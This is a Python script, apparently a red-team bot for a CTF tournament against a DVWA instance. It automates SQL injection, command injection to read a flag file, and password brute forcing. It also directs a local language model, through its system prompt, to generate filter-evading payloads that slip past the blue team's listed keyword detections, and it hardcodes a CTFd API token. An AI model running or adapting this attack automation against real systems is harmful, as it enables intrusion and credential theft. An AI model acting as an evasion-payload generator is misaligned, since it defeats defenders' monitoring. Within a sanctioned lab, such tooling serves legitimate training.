from openai import OpenAI
import requests
import re
import time

# ============================================
# CONFIGURATION
# ============================================
LM_STUDIO_URL = "http://localhost:1234/v1"
TARGET = "http://159.203.87.83:8080"
CTFD_URL = "http://159.203.87.83:8000"
CTFD_TOKEN = "ctfd_7a87222d5e0ac284965d7d39ef5258a69666087655c6ce5910c2670ae727d07d"  # ← your token

CHALLENGES = {
    "sql_injection": 1,
    "command_injection": 2,
    "brute_force": 3
}

# ====================== ZAP PAYLOAD GENERATOR ======================
ZAP_PAYLOADS_FILE = "zap_payloads.txt"   # ← one payload per line from ZAP fuzzer

def load_zap_payloads():
    try:
        with open(ZAP_PAYLOADS_FILE, "r", encoding="utf-8") as f:
            payloads = [line.strip() for line in f if line.strip()]
        print(f"[+] Loaded {len(payloads)} payloads from ZAP")
        return payloads
    except FileNotFoundError:
        print(f"[!] {ZAP_PAYLOADS_FILE} not found — using LLM only")
        return []
    except Exception as e:
        print(f"[!] Error loading ZAP payloads: {e}")
        return []

# ============================================

client = OpenAI(base_url=LM_STUDIO_URL, api_key="lm-studio")
session = requests.Session()
captured_flags = set()

def ask_llm(prompt, system=None):
    if system is None:
        system = """You are an automated red team bot in a CTF tournament.
You are attacking DVWA (low security). Blue team is watching for these exact substrings (case-insensitive):
- union select, or '1'='1', or 1=1
- union, select, information_schema, or 1=, 0x, /*! , */ , unio
- ;cat, ;ls, | cat, && cat, flag2.txt, $(cat, `cat, /hackable/flags

ALWAYS use evasion: insert /**/ comments to break keywords (e.g. un/**/ion se/**/lect), mix case, add whitespace, use char()/hex where helpful.
Give ONLY the raw payload. Nothing else. No explanation. No markdown."""
    response = client.chat.completions.create(
        model="local-model",
        messages=[
            {"role": "system", "content": system},
            {"role": "user", "content": prompt}
        ]
    )
    return response.choices[0].message.content.strip()

# ====================== CORE HELPERS ======================
def login_to_dvwa():
    print("[*] Logging into DVWA...")
    r = session.get(f"{TARGET}/login.php")
    token = re.search(r"user_token.*?value='(.*?)'", r.text)
    token = token.group(1) if token else ""
    session.post(f"{TARGET}/login.php", data={
        "username": "admin", "password": "password", "Login": "Login", "user_token": token
    })
    print("[+] Logged in successfully")

def set_dvwa_security_low():
    r = session.get(f"{TARGET}/security.php")
    token = re.search(r"user_token.*?value='(.*?)'", r.text)
    token = token.group(1) if token else ""
    session.post(f"{TARGET}/security.php", data={
        "security": "low", "seclev_submit": "Submit", "user_token": token
    })
    print("[*] Security set to low")

def is_blocked():
    try:
        r = session.get(f"{TARGET}/index.php", timeout=5)
        return "login" in r.url.lower()
    except:
        return True

def get_ctfd_nonce():
    r = requests.get(f"{CTFD_URL}/challenges", headers={"Authorization": f"Token {CTFD_TOKEN}"})
    nonce = re.search(r"'csrfNonce': \"(.*?)\"", r.text)
    return nonce.group(1) if nonce else ""

def submit_flag(flag, challenge_id):
    if flag in captured_flags:
        return
    print(f"[*] Submitting flag: {flag}")
    nonce = get_ctfd_nonce()
    result = requests.post(
        f"{CTFD_URL}/api/v1/challenges/attempt",
        json={"challenge_id": challenge_id, "submission": flag},
        headers={"Authorization": f"Token {CTFD_TOKEN}", "Content-Type": "application/json", "CSRF-Token": nonce}
    )
    if result.status_code == 200 and result.json().get("data", {}).get("status") == "correct":
        print(f"[+] FLAG ACCEPTED!")
        captured_flags.add(flag)

def extract_flag(text):
    match = re.search(r"FLAG\{.*?\}", text)
    return match.group(0) if match else None

# ====================== ZAP + LLM HELPER ======================
def try_payloads_with_zap_first(base_task, endpoint_func):
    """Tries ZAP payloads first, then falls back to LLM evasion"""
    zap_payloads = load_zap_payloads()
    attempt_history = []

    # === PHASE 1: ZAP payloads ===
    print(f"[*] Trying {len(zap_payloads)} ZAP payloads first...")
    for payload in zap_payloads:
        if is_blocked():
            return False
        print(f"[*] ZAP payload: {payload}")
        try:
            result = endpoint_func(payload)
            flag = extract_flag(result)
            if flag:
                print(f"[!!!] FLAG FOUND with ZAP payload: {flag}")
                return flag
            attempt_history.append(payload)
        except:
            pass
        time.sleep(0.8)  # gentle delay so blue team doesn't instantly block

    # === PHASE 2: LLM evasion fallback ===
    print("[*] ZAP list exhausted — switching to LLM evasion mode")
    for i in range(12):  # more attempts since we already burned the ZAP list
        if is_blocked():
            return False
        payload = ask_llm(f"""
Task: {base_task}
Target: {TARGET}
Previous payloads (including ZAP) failed.
Generate one heavily evasive payload using /**/ comments, case mixing, etc.
Raw payload only.
""")
        print(f"[*] LLM payload {i+1}: {payload}")
        try:
            result = endpoint_func(payload)
            flag = extract_flag(result)
            if flag:
                print(f"[!!!] FLAG FOUND with LLM payload: {flag}")
                return flag
            attempt_history.append(payload)
        except:
            pass
        time.sleep(1.2)
    return False

# ============================================
# CHALLENGE 1 — SQL INJECTION
# ============================================
def attack_sql_injection():
    print("\n" + "="*50)
    print("[*] CHALLENGE 1: SQL INJECTION (ZAP + LLM)")
    print("="*50)

    def try_sqli(payload):
        try:
            r = session.get(f"{TARGET}/vulnerabilities/sqli/", params={"id": payload, "Submit": "Submit"}, timeout=5)
            return r.text
        except:
            return ""

    # Use our combined ZAP + LLM function
    flag = try_payloads_with_zap_first(
        base_task="SQL injection on id parameter. Return multiple rows from users table.",
        endpoint_func=try_sqli
    )
    if flag:
        submit_flag(flag, CHALLENGES["sql_injection"])
        return True

    print("[-] SQL injection failed")
    return False

# ============================================
# CHALLENGE 2 — COMMAND INJECTION
# ============================================
def attack_command_injection():
    print("\n" + "="*50)
    print("[*] CHALLENGE 2: COMMAND INJECTION (ZAP + LLM)")
    print("="*50)

    def try_cmd(payload):
        try:
            r = session.post(f"{TARGET}/vulnerabilities/exec/", data={"ip": payload, "Submit": "Submit"}, timeout=5)
            return r.text
        except:
            return ""

    flag = try_payloads_with_zap_first(
        base_task="Command injection on ip field. Read flag from /var/www/html/hackable/flags/flag2.txt",
        endpoint_func=try_cmd
    )
    if flag:
        submit_flag(flag, CHALLENGES["command_injection"])
        return True

    print("[-] Command injection failed")
    return False

# ============================================
# CHALLENGE 3 — BRUTE FORCE (unchanged)
# ============================================
def attack_brute_force():
    print("\n" + "="*50)
    print("[*] CHALLENGE 3: BRUTE FORCE")
    print("="*50)

    usernames = ["admin", "user", "test", "guest", "administrator"]
    passwords = ["password", "123456", "admin", "test", "password123", "letmein", "welcome", "monkey", "dragon"]

    for username in usernames:
        for password in passwords:
            if is_blocked(): return False
            try:
                r = session.get(f"{TARGET}/vulnerabilities/brute/", params={"username": username, "password": password, "Login": "Login"}, timeout=5)
                if "Welcome to the password protected area" in r.text:
                    print(f"[+] CREDENTIALS FOUND: {username}:{password}")
                    flag_r = session.get(f"{TARGET}/hackable/flags/flag3.txt", timeout=5)
                    flag = extract_flag(flag_r.text)
                    if flag:
                        print(f"[!!!] FLAG FOUND: {flag}")
                        submit_flag(flag, CHALLENGES["brute_force"])
                        return True
            except:
                pass

    print("[*] Common creds exhausted — asking LLM...")
    more_pw = ask_llm("Give 15 more strong passwords for DVWA brute force (one per line, raw only)")
    for pw in more_pw.strip().splitlines()[:15]:
        pw = pw.strip()
        if not pw: continue
        if is_blocked(): return False
        try:
            r = session.get(f"{TARGET}/vulnerabilities/brute/", params={"username": "admin", "password": pw, "Login": "Login"}, timeout=5)
            if "Welcome to the password protected area" in r.text:
                flag_r = session.get(f"{TARGET}/hackable/flags/flag3.txt", timeout=5)
                flag = extract_flag(flag_r.text)
                if flag:
                    print(f"[!!!] FLAG FOUND: {flag}")
                    submit_flag(flag, CHALLENGES["brute_force"])
                    return True
        except:
            pass

    print("[-] Brute force failed")
    return False

# ============================================
# MAIN
# ============================================
def attack_all():
    login_to_dvwa()
    set_dvwa_security_low()

    results = {"sql_injection": False, "command_injection": False, "brute_force": False}

    results["sql_injection"] = attack_sql_injection()

    if not is_blocked():
        results["command_injection"] = attack_command_injection()

    if not is_blocked():
        results["brute_force"] = attack_brute_force()

    print("\n" + "="*50)
    print("RED TEAM FINAL SCORE")
    print("="*50)
    captured = sum(1 for v in results.values() if v)
    for chal, success in results.items():
        print(f"  {chal}: {'CAPTURED' if success else 'FAILED'}")
    print(f"\nFlags captured: {captured}/3")
    print(f"Scoreboard: {CTFD_URL}/scoreboard")
    print("="*50)

if __name__ == "__main__":
    print("=== RED TEAM BOT STARTING (ZAP + LLM evasion) ===")
    print(f"[*] ZAP payload file: {ZAP_PAYLOADS_FILE}")
    attack_all()
